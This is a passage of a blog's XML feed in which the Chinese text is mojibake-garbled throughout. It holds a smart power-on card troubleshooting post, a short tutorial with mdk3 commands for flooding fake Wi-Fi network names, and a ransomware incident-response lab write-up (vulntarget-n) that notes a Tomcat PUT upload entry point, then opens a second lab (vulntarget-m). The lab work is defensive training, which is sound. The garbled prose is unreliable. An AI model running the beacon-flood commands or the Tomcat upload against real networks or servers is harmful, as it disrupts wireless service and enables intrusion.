äºæ˜¯æ‹†å¼€ç”µè„‘é‡æ–°æ’ä¸€ä¸‹å¼€æœºå¡ï¼Œè®©å®ƒæ–­ç”µï¼ˆç›¸å½“äºé‡ç½®å¼€æœºå¡çš„flashï¼‰ï¼Œå†æ‰“å¼€ç±³å®¶å°±æ˜¾ç¤ºæ­£å¸¸äº†æˆåŠŸæ’’èŠ±ğŸ‰

ä¸è¿‡è¿™é‡Œæˆ‘é«˜å…´çš„ä¹Ÿå¤ªæ—©äº†ï¼Œå°è¯•è¯­éŸ³æ‰“å¼€ç”µè„‘ä¼šå‘ç°å°çˆ±éŸ³ç®±æ­£å¸¸å›å¤å¼€äº†ï¼Œç”µè„‘ä¹Ÿäº®äº†ï¼Œä½†æ˜¯å°±è¿›ä¸å»ç³»ç»Ÿï¼ˆéš¾é“æ˜¯åœ¨è‡ªæ£€ï¼Ÿå†ç­‰ç­‰â€¦â€¦TMDåå‡ åˆ†é’Ÿè¿‡å»ä»–è¿˜æ˜¯æš—ç€çš„ï¼‰ï¼Œç„¶åæ‰“å¼€ç±³å®¶è¿›å…¥è®¾å¤‡ç‚¹å‡»å¼€å…³æœºä¹Ÿæ¯«æ— ååº”ï¼ŒæŒ‰é‡å¯é”®å†ä»”ç»†è§‚å¯Ÿå‘ç°è¿åç¡•çš„é‚£ä¸ªæ ‡å¿—éƒ½æ²¡å‡ºç°è¿‡

åé¢å†æ¬¡å°è¯•ä¼šå‘ç°å®ƒå¼€å§‹å‡ºç°åç¡•çš„æ ‡å¿—ï¼Œä½†æ˜¯ä¸€é—ªè€Œè¿‡ï¼Œå†æ¬¡å°è¯•å‘ç°å®ƒè¿˜èƒ½è¿›ç³»ç»Ÿäº†ï¼Œä½†æ˜¯åˆšçœ‹åˆ°æ¡Œé¢å®ƒå°±è‡ªå·±å…³æœºäº†
è¿™é‡Œåº”è¯¥å°±æ˜¯å°ç±³çš„bugï¼ˆä¸æ„§æ˜¯å°ç±³çš„æ¨¡ç»„ï¼Œå®¢æœçš„å›ç­”ä¹Ÿæ˜¯è®©æˆ‘ä¸€å¤´é›¾æ°´çœ‹ä¸æ‡‚ä»–è¦è¡¨è¾¾ä»€ä¹ˆï¼‰ï¼Œéœ€è¦å‰å¾€ç±³å®¶ï¼Œå…³é—­ç‚¹åŠ¨æ¨¡å¼

å†æ‰“å¼€é€šç”µåé»˜è®¤çŠ¶æ€ï¼Œé€‰æ‹©ä¿®å¤æ–­ç”µå‰çŠ¶æ€

æœ€åå†æ¥è¯•è¯•ï¼ˆå…ˆç¨³å¦¥ç‚¹æ‰“å¼€ç±³å®¶æ‰‹å·¥ç‚¹å‡»å¼€å¯è¿›å…¥ç³»ç»Ÿåå†è¿›è¡Œè¯­éŸ³æ§åˆ¶ï¼‰å‘ç°æˆåŠŸäº†ï¼
]]></content>
      <categories>
        <category>æŠ˜è…¾å®å½•</category>
      </categories>
      <tags>
        <tag>ç±³å®¶ç”µè„‘å¼€æœºå¡</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡ç”Ÿæˆè™šå‡WiFi</title>
    <url>/2022/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87WiFi/</url>
    <content><![CDATA[å‰æœŸå‡†å¤‡kali + æ— çº¿ç½‘å¡
æ“ä½œè¿‡ç¨‹é¦–å…ˆæˆ‘ä»¬éœ€è¦è£…ä¸€ä¸‹mkd3
sudo apt-get install mdk3

æ¥ç€è¿ä¸‹æˆ‘ä»¬çš„æ— çº¿ç½‘å¡

ç„¶åæˆ‘ä»¬ iwconfig æŸ¥çœ‹ä¸‹æ˜¯å¦çœŸçš„è¿ä¸Š

æ·»åŠ mon0
iw wlan0 interface add mon0 type monitoriwconfig æ£€æµ‹ä¸€ä¸‹æ˜¯å¦æˆåŠŸ


å¡«å†™WiFiåå­—
vi wifi.lstè¾“å…¥iè¿›è¡Œç¼–è¾‘ï¼ˆå¦‚æœä½ ä¸çŸ¥é“çš„è¯æˆ‘ç»™ä½ æé†’ä¸€ä¸‹è¾“å…¥ä½ æƒ³è¦å–çš„WiFiåå­—Ctrl+C ç„¶å :wqæˆ–è€…:xå®ç°ä¿å­˜å¹¶é€€å‡ºï¼ˆå¦‚æœä½ ä¸çŸ¥é“çš„è¯æˆ‘ç»™ä½ æé†’ä¸€ä¸‹


æœ€åç”ŸæˆWiFi
mdk3 mon0 b -f wifi.lst


]]></content>
      <categories>
        <category>ç ”ç©¶éšç¬”</category>
      </categories>
      <tags>
        <tag>fakewifi</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-n</title>
    <url>/2024/11/16/vulntarget-n/</url>
    <content><![CDATA[å‰è¨€åœ¨é¢å¯¹å‹’ç´¢ç—…æ¯’è¿™æ ·çš„ç½‘ç»œå¨èƒæ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½è¢«åŠ¨ç­‰å¾…ï¼Œè€Œè¦ç§¯æåº”å¯¹ã€‚æˆ‘ä»¬éœ€è¦äº†è§£æ”»å‡»çš„åŸç†å’Œè¿‡ç¨‹ï¼Œç†Ÿç»ƒæŒæ¡åº”æ€¥å“åº”å’Œå–è¯åˆ†æçš„æŠ€æœ¯ï¼Œä»¥ä¾¿åœ¨é¢å¯¹çœŸå®çš„å¨èƒæ—¶èƒ½å¤Ÿè¿…é€Ÿæœ‰æ•ˆåœ°åº”å¯¹ã€‚
vulntarget-næ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå…¨çƒåŒ–å‹’ç´¢ç—…æ¯’é«˜å‘ç¯å¢ƒä¸‹çš„åº”æ€¥å“åº”å’Œå–è¯åˆ†ææ¡ˆä¾‹ï¼Œå…¶æ¨¡æ‹Ÿäº†ä¸€ä¸ªæ­£å¸¸è¿è¡Œçš„ä¸šåŠ¡æœåŠ¡è¢«å‹’ç´¢ç—…æ¯’æ”»å‡»çš„æƒ…æ™¯ï¼š

å®¢æˆ·åœ¨é˜¿é‡Œäº‘éƒ¨ç½²çš„ä¸šåŠ¡ç¯å¢ƒ
ä»Šå¤©çªç„¶å‘ç°é¦–é¡µå˜æˆäº†ä¸€ä¸ªå‹’ç´¢çš„ç•Œé¢ï¼Œè¦æ±‚ç”¨æˆ·æ”¯ä»˜èµé‡‘ä»¥è§£å¯†æ•°æ®
å®¢æˆ·å‘ç°å…¶ä¸­éƒ¨åˆ†é‡è¦æ–‡ä»¶è¢«åŠ å¯†ä¸º.vulntargetç»“å°¾


éšå³å®¢æˆ·è¦ä½ è¿›è¡Œåº”æ€¥å“åº”å¹¶å–è¯åˆ†æï¼Œå› ä¸ºæ˜¯é˜¿é‡Œäº‘çš„ECSï¼Œå®¢æˆ·å°†é˜¿é‡Œäº‘ECSå®ä¾‹é•œåƒå¯¼å‡ºåˆ°æœ¬åœ°ï¼Œè¦æ±‚ä½ åœ¨æ˜å¤©åˆ†æå‡ºç»“æœã€‚
å…·ä½“è¦æ±‚å¦‚ä¸‹ï¼š

åˆ†ææ”»å‡»äº‹ä»¶æ˜¯å¦‚ä½•å‘ç”Ÿçš„ï¼Œè¯·ç»™å‡ºæ”»å‡»ç”»åƒ
è§£å¯†å‹’ç´¢
æ¢å¤åŸæ¥çš„index.jspé¡µé¢ï¼Œæ¢å¤æ­£å¸¸çš„webæœåŠ¡
æ‰¾åˆ°éšè—åœ¨å…¶ä¸­çš„3ä¸ªflag

å·²çŸ¥æœåŠ¡å™¨ç³»ç»Ÿä¸ºUbuntu20.04ï¼Œè´¦å·å¯†ç ï¼š è´¦å·ï¼šroot å¯†ç ï¼šVulntarget@123
psï¼šåœ¨æœ¬æ¬¡é¶åœºè®¾è®¡ä¸­å°‘äº†ä¸€æ¬¡åå¼¹shellçš„æ“ä½œï¼Œä¸»è¦æ˜¯é˜²æ­¢è®¾è®¡è€…çš„ipå‡ºç°æ³„éœ²ï¼Œåœ¨æ”»å‡»è·¯å¾„æè¿°ä¸­å¯ä»¥ç›´æ¥æŠŠåå¼¹shellçš„æ­¥éª¤åŠ ä¸Šå³å¯ã€‚
å‡†å¤‡å·¥ä½œè§£å‹å®Œæ˜¯ä¸ªrawæ–‡ä»¶ï¼ŒVMwareæ— æ³•ç›´æ¥æ‰“å¼€

å¯åˆ©ç”¨qemuå·¥å…·è½¬æ¢ä¸ºvmdkæ ¼å¼
å·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://qemu.weilnetz.de/w64/è½¬æ¢å‘½ä»¤ï¼šqemu-img.exe convert -f raw -O vmdk vuln_m-j6cegcrhehdcba0r5h4v_system.raw vulntarget-n.vmdk


ç„¶åæ–°å»ºè™šæ‹Ÿæœºï¼Œç¨åå®‰è£…æ“ä½œç³»ç»Ÿï¼Œé€‰æ‹©ç£ç›˜ä¸ºä½¿ç”¨ç°æœ‰è™šæ‹Ÿç£ç›˜ï¼Œä¿æŒç°æœ‰æ ¼å¼å³å¯


åº”æ€¥å“åº”é¦–å…ˆæŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·ç­‰æƒ…å†µï¼Œæœªå‘ç°å¼‚å¸¸è´¦å·

ç„¶åæ£€æŸ¥æ˜¯å¦å­˜åœ¨å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ç­‰ï¼Œä½†ä¹Ÿæœªå‘ç°å¼‚å¸¸

æ¥ç€ï¼Œå†æ¥æŸ¥çœ‹å†å²å‘½ä»¤å‘ç°flagï¼šflag{vulntarget_very_G00d}
root@iZj6c6hytildlalnu0cwt4Z:~# cat .bash_history    1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y    2  vim /etc/profile    3  source /etc/profile    4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip    5  unzip apache-tomcat-7.0.79.zip    6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat    7  mv apache-tomcat-7.0.79 /opt/tomcat    8  chmod +x /opt/tomcat/bin/*.sh    9  ls   10  history    11  flag&#123;vulntarget_very_G00d&#125;   12  /opt/tomcat/bin/startup.sh   13  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak   14  vim /opt/tomcat/conf/server.xml   15  ps -axu | grep tomcat   16  kill -9 6961   17  /opt/tomcat/bin/startup.sh   18  cp web.xml web.xml.bak   19  pwd    20  cd ..   21  ls   22  cd /opt/   23  ls   24  cd tomcat/   25  ls   26  cd conf/   27  cp web.xml web.xml.bak   28  vim web.xml   29  ps -axu | grep tomcat   30  kill -9 7409   31  /opt/tomcat/bin/startup.sh   32  pwd    33  cd ..   34  ls   35  cd webapps/   36  ls   37  cd ROOT/   38  ls   39  rm favicon.ico    40  cp index.jsp index.jsp.bak   41  ls   42  vim index.jsp   43  rm index.jsp   44  vim index.jsp   45  crontab -e   46  history    47  ls   48  mv vulntargetn.jsp 404.jsp   49  ls   50  rm index.jsp.bak   51  pip3 install rsa   52  ls   53  ls -lha   54  mkdir .vulntarget   55  cd .vulntarget/   56  ls   57  mkdir keys   58  ls   59  history    60  ls   61  vim get_pem.py   62  python3 get_pem.py    63  ls   64  rm get_pem.py    65  ls   66  cd ..   67  ls   68  cp .vulntarget/keys/pubkey.pem .   69  ls   70  ls | grep jsp   71  vim encrypt_vulntarget.py   72  ls   73  vim flag.jsp   74  ls | grep jsp   75  python3 encrypt_vulntarget.py    76  ls   77  cd .vulntarget/   78  ls   79  cd keys/   80  ls   81  cat pubkey.pem    82  cat privkey.pem    83  cd ..   84  ls   85  cd ..   86  ls   87  rm encrypt_vulntarget.py    88  rm pubkey.pem    89  ls   90  vim index.jsp   91  ls   92  cd ..   93  ls   94  cd ..   95  ls   96  cd logs/   97  ls   98  cat localhost_access_log.2024-06-04.txt    99  vim localhost_access_log.2024-06-04.txt   100  ls  101  vim localhost_access_log.2024-06-04.txt   102  ls  103  history   104  curl http://127.0.0.1  105  ls  106  cd   107  ls  108  ls -lha  109  cat .bashrc   110  ls  111  history &gt; .bash_historyapt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -yvim /etc/profilesource /etc/profilewget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zipunzip apache-tomcat-7.0.79.zipmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatchmod +x /opt/tomcat/bin/*.shlshistory flag&#123;vulntarget_very_G00d&#125;/opt/tomcat/bin/startup.shcp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bakvim /opt/tomcat/conf/server.xmlps -axu | grep tomcatkill -9 6961/opt/tomcat/bin/startup.shcp web.xml web.xml.bakpwd cd ..lscd /opt/lscd tomcat/lscd conf/cp web.xml web.xml.bakvim web.xmlps -axu | grep tomcatkill -9 7409/opt/tomcat/bin/startup.shpwd cd ..lscd webapps/lscd ROOT/lsrm favicon.ico cp index.jsp index.jsp.baklsvim index.jsprm index.jspvim index.jspcrontab -ehistory lsmv vulntargetn.jsp 404.jsplsrm index.jsp.bakpip3 install rsalsls -lhamkdir .vulntargetcd .vulntarget/lsmkdir keyslshistory lsvim get_pem.pypython3 get_pem.py lsrm get_pem.py lscd ..lscp .vulntarget/keys/pubkey.pem .lsls | grep jspvim encrypt_vulntarget.pylsvim flag.jspls | grep jsppython3 encrypt_vulntarget.py lscd .vulntarget/lscd keys/lscat pubkey.pem cat privkey.pem cd ..lscd ..lsrm encrypt_vulntarget.py rm pubkey.pem lsvim index.jsplscd ..lscd ..lscd logs/lscat localhost_access_log.2024-06-04.txt vim localhost_access_log.2024-06-04.txt lsvim localhost_access_log.2024-06-04.txt lshistory curl http://127.0.0.1lscd lsls -lhacat .bashrc lshistory &gt; .bash_historyhistory exit


åˆ†æè¿™äº›æ•æ„Ÿå†å²å‘½ä»¤å‘ç°æ”»å‡»è€…å¯èƒ½å°†webshellå†™å…¥åˆ°tomcatç›®å½•ä¸‹ï¼ŒåŒæ—¶è¿˜å‘ç°äº†æ”»å‡»è€…åˆ›å»ºéšè—ç›®å½•.vulntargetï¼Œå¹¶ä¸”ç¼–å†™è¿è¡Œget_pem.pyå’Œencrypt_vulntarget.pyè¿™ä¸¤ä¸ªrsaåŠ å¯†è„šæœ¬æ¥ç”ŸæˆåŠ å¯†å¯†é’¥å¯¹å¹¶åŠ å¯†
æ ¹æ®å†å²å‘½ä»¤æ¥æŸ¥çœ‹tomcatæ—¥å¿—localhost_access_log.2024-06-04.txtï¼Œå¯çŸ¥æ˜¯tomcat PUTæ–‡ä»¶ä¸Šä¼ 

å¹¶ä¸”å¾—åˆ°flagï¼šflag{Welcome_t0_join_Us}

è¿›å…¥tomcatçš„webç›®å½•ä¸‹å‘ç°ä¸€å…±åŠ å¯†äº†4ä¸ªæ–‡ä»¶
root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/404.jsp.vulntarget N/nNQJJ60jZ6WvLltQK5U6+jKQ0HicpJW2gGt8YbxWqZxE+k4KyIpaDZCicGRsOHAuo+hYuLLX1wRDLt7BDvfnPdqeI/XMiGsL7nkx2Hc5FwD/MJrZYy0i5bzQvg955W6YiI8KKcfpeYI0+aZMuP7tP9duuiu+YHvmnD/1Wq0n1r/fEhWoSnZyAm5Gcc9AjpCPQQI3yF1APbDyHywCW64kOmN+kd/B5cLi62zfxgYnfUff31gtHf+G0FgHFEB0bze+epyKfBumuDGklzKajtJm79fGqlwjh26sPz6jUR1k54h6jDqM15qZKbD3z7E37k3IPpfjspTWwKchmHB6oMmEfLSXGvI4ECNb9KIVxjUADSO8oYZpNaNJmOKF4x/GndhCK++jPOHhZywhjhDHthqH+yLQGsN2+KiLqBJp8RyP8dFXbANgp+agls4cMfVTgEfQzjkJKtELBzmQoskB+WdUk9v0vczio4d//nGXeWm1eRDbL5BhQQuo2cTEFBA9aDC8mJtFCqxafLoVeWxjYac8r+0iXPIfPklpcxqDwdTam5n7GlNOeJZgFwrmuREyTQ+iGijTzIcX4eqPTTowdi+GpLTXGF1XSESl9g/OLRKrai+DVM3AoQ8fOR5DSS6b8RZvPjKNoqXpS4jSn02w7GXz3SdJcqbZwRdQ/lS712S5g=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/flag.jsp.vulntarget Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/index.jsp.vulntarget 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root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/vulntarget.jsp.vulntarget goH93IcI5UeCpubU5frhuBhnmDcKEXVyE0i7yE07yyuHTVwnhRq8u44y2EbZiH77amDZrn+mWvhohGKC4is9mrjh2Fj7QuMSe5mqi9zSM4UhmIF+H8PjcYJny3KPoLko8kl+8tNMZxYiAtl9RIJ3cdXMLDPxyP6Mq42jisW2K+o=


å†å²å‘½ä»¤ä¸­æœç´¢.pemæ–‡ä»¶ï¼Œæ‰¾åˆ°ç§é’¥æ–‡ä»¶

ä»è€Œè§£å¯†å¾—åˆ°flagï¼šflag{https://github.com/crow821/vulntarget}
from cryptography.hazmat.primitives import serialization, hashesfrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives import hashesfrom cryptography.hazmat.primitives.asymmetric import rsafrom base64 import b64decode# è¯»å–å…¬é’¥å’Œç§é’¥æ–‡ä»¶with open(&#x27;privkey.pem&#x27;, &#x27;rb&#x27;) as key_file:    private_key = serialization.load_pem_private_key(        key_file.read(),        password=None,    )# è¯»å–å¯†æ–‡encrypted_flag = b64decode(&#x27;Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=&#x27;)# è§£å¯†å¯†æ–‡decrypted_flag = private_key.decrypt(    encrypted_flag,    padding.PKCS1v15()  # ä½¿ç”¨PKCS#1 v1.5 padding)print(f&quot;&#123;decrypted_flag.decode(&#x27;utf-8&#x27;)&#125;&quot;)


æ¼æ´å¤ç°ç›´æ¥PUTæ–¹å¼ä¸Šä¼ æ–‡ä»¶å‘ç°ä¸ä¿®æ”¹åç¼€åä¸Šä¼ å¤±è´¥äº†

åœ¨åé¢åŠ ä¸ª/éªŒè¯ä¸Šä¼ æˆåŠŸï¼Œè‡³æ­¤å³å¯ç¡®è®¤å…¥å£ç‚¹ä¸ºTomcat PUTä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´

ä¸šåŠ¡æ¢å¤ç”±äºç½‘ç«™é¦–é¡µä¹Ÿè¢«ä¿®æ”¹äº†ï¼Œè¿˜éœ€è¦è§£å¯†å‰é¢çš„index.jsp.vulntarget

ç”¨ä¹‹å‰çš„è„šæœ¬ä¼šå‘ç°æŠ¥é”™é•¿åº¦ä¸ä¸€è‡´

åé¢åˆ©ç”¨åœ¨çº¿å·¥å…·è§£å¯†æˆåŠŸ

æ›¿æ¢è§£å¯†åçš„index.jspå³å¯æ¢å¤

]]></content>
      <categories>
        <category>é¶åœºé€šå…³</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-m</title>
    <url>/2024/10/27/vulntarget-m/</url>
    <content><![CDATA[å‰è¨€
æ‹“æ‰‘


å…¥å£æœºä¸ºåŒç½‘å¡ï¼Œå¤–ç½‘å¯ä»¥æ ¹æ®è‡ªèº«æƒ…å†µï¼Œè®¾ç½®æ¡¥æ¥æˆ–natæ¨¡å¼ï¼Œå†…ç½‘ipå›ºå®šä½192.168.137.20
å†…ç½‘æœº02ä¸ºä»…ä¸»æœºæ¨¡å¼ï¼Œipå›ºå®šä½192.168.137.10ï¼Œè¯¥ipä¸èƒ½å˜æ›´ã€‚
å†…ç½‘æœº03ä¸ºä»…ä¸»æœºæ¨¡å¼ï¼Œipå›ºå®šä½192.168.137.30

ä¸‰å°æœºå­çš„è´¦å·å¯†ç å‡ä¸ºvulntargetï¼Œè¯¥å¯†ç ä»…é™è°ƒè¯•ç¯å¢ƒä½¿ç”¨ï¼Œå¹¶ä¸æ˜¯ç»™ä½ ç”¨æ¥åº”æ€¥çš„ï¼Œåº”æ€¥éœ€è¦ä»æ¼æ´æ‰“è¿›å»æ‰èƒ½åº”æ€¥


æ³¨æ„äº‹é¡¹

æœ¬æ¬¡ç¯å¢ƒvulntarget-må†…ç½‘é¶åœºä¸»è¦ä¸ºå†…ç½‘æ¸—é€+åº”æ€¥å“åº”è®¾å®šï¼Œå…¶ä¸­åº”æ€¥éƒ¨åˆ†ä¸»è¦æ¶‰åŠjavaå†…å­˜é©¬ã€åé—¨ç­‰ï¼Œå› ä¸ºåœ¨é¶æ ‡ä¸­å«æœ‰å¤šä¸ªå†…å­˜é©¬ï¼Œæ‰€ä»¥æ‚¨åœ¨æœ¬åœ°ä½¿ç”¨Vmwareå¤ç°è¯¥ç¯å¢ƒæ—¶ï¼Œåªèƒ½å¤Ÿé€šè¿‡å›æ»šå¿«ç…§çš„æ–¹æ³•æ¥é‡ç½®ç¯å¢ƒï¼Œä¸èƒ½å¤Ÿå°†ç¯å¢ƒç›´æ¥é‡å¯ï¼Œé‡å¯ä¼šå¯¼è‡´å†…å­˜é©¬å¤±æ•ˆã€‚
åŒæ ·å› ä¸ºå†…å­˜é©¬çš„ç‰¹æ®Šæ€§ï¼Œå¯èƒ½ä¼šå¯¼è‡´åœ¨æ”»é˜²æ—¶å‡ºç°ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚åœ¨æ³¨å…¥å†…å­˜é©¬æ—¶å› ä¸ºè·¯å¾„é—®é¢˜ã€ç±»å‹é—®é¢˜å¯¼è‡´çš„è¦†ç›–ã€å†²çªç­‰ï¼Œè¿™æ—¶å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•ã€‚

ç¯å¢ƒæè¿°

æŸå…¬å¸å°†è‡ªå·±å…¬å¸çš„ä¸šåŠ¡æ¬åˆ°äº†äº‘ä¸Šï¼Œå¹¶å­˜åœ¨å†…ç½‘æœåŠ¡ï¼Œå…¬å¸è¿ç»´äººå‘˜ä¸»è¦é€šè¿‡è¿œç¨‹sshç™»å½•å…¥å£æœºï¼Œå¯¹æœåŠ¡è¿›è¡Œæ—¥å¸¸ç»´æŠ¤å’Œç®¡ç†ã€‚
åœ¨å‰æ®µæ—¶é—´ï¼ŒæŸå›½å¤–é»‘å®¢å‘ç°è¯¥å…¬å¸çš„å…¥å£æœºå­˜åœ¨æ¼æ´ï¼Œå¹¶å…¥ä¾µäº†è¯¥æœºå™¨ï¼ŒåŒæ—¶å¯èƒ½å…¥ä¾µäº†å†…ç½‘ç³»ç»Ÿã€‚
è¿ç»´åœ¨ä»Šæ—¥ç™»å½•ç»´æŠ¤çš„æ—¶å€™ï¼Œå‘ç°sshæ— æ³•ç™»å½•ï¼Œç»è¿‡æ’æŸ¥å‘ç°sshå¯†ç ç›®å‰å·²ç»è¢«ä¿®æ”¹ã€‚
